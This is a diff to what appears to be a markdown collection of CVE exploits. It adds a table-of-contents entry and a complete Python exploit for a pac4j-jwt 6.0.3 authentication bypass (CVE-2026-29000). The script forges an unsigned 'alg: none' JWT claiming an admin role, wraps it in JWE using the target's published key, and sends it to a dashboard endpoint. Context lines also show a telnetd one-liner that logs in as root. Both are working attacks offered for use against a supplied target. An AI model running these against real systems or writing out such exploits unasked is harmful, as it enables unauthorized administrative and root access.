@@ -48,6 +48,7 @@
 - [CVE-2025-55182: React2Shell RCE](#cve-2025-55182-react2shell-rce)
 - [CVE-2025-9074: Docker API Unauthorized Access RCE](#cve-2025-9074-docker-api-unauthorized-access-rce)
 - [CVE-2026-24061: GNU Inetutils telnetd RCE](#cve-2026-24061-gnu-inetutils-telnetd-rce)
+- [CVE-2026-29000: Authentication Bypass in pac4j-jwt 6.0.3 JwtAuthenticator](CVE-2026-29000-authentication-bypass-in-pac4j-jwt-603-jwtauthenticator)
 - [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
@@ -2321,6 +2322,71 @@ $ sudo /etc/init.d/inetutils-inetd start
 
 ```console
 $ USER="-f root" telnet -a localhost
+```
+## CVE-2026-29000: Authentication Bypass in pac4j-jwt 6.0.3 JwtAuthenticator
+
+```python
+#!/usr/bin/env python3
+# CVE-2026-29000 — pac4j-jwt 6.0.3 Authentication Bypass
+# JwtAuthenticator accepts PlainJWT wrapped in JWE, skipping signature validation
+
+import json, time, base64, sys
+import requests
+from jwcrypto import jwk, jwe
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+def fetch_pubkey(target: str) -> tuple[jwk.JWK, str]:
+    r = requests.get(f"{target}/api/auth/jwks", timeout=10)
+    r.raise_for_status()
+    key_data = r.json()["keys"][0]
+    return jwk.JWK(**key_data), key_data["kid"]
+
+def forge_plain_jwt(sub: str = "admin", role: str = "ROLE_ADMIN") -> str:
+    now = int(time.time())
+    header  = b64url(json.dumps({"alg": "none"}).encode())
+    payload = b64url(json.dumps({
+        "sub": sub, "role": role,
+        "iss": "principal-platform",
+        "iat": now, "exp": now + 3600
+    }).encode())
+    return f"{header}.{payload}."
+
+def wrap_jwe(plain_jwt: str, pub_key: jwk.JWK, kid: str) -> str:
+    token = jwe.JWE(
+        plain_jwt.encode(),
+        recipient=pub_key,
+        protected=json.dumps({
+            "alg": "RSA-OAEP-256",
+            "enc": "A128GCM",
+            "kid": kid,
+            "cty": "JWT"
+        })
+    )
+    return token.serialize(compact=True)
+
+def exploit(target: str) -> None:
+    pub_key, kid = fetch_pubkey(target)
+    plain_jwt    = forge_plain_jwt()
+    forged_token = wrap_jwe(plain_jwt, pub_key, kid)
+
+    r = requests.get(
+        f"{target}/api/dashboard",
+        headers={"Authorization": f"Bearer {forged_token}"},
+        timeout=10
+    )
+    r.raise_for_status()
+    user = r.json()["user"]
+
+    print(f"[+] {user['username']} ({user['role']}) — HTTP {r.status_code}")
+    print(f"[+] {forged_token}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <target>")
+        sys.exit(1)
+    exploit(sys.argv[1])
 ```
 
 ## BadSuccessor Delegated Managed Service Account (dMSA) LPE
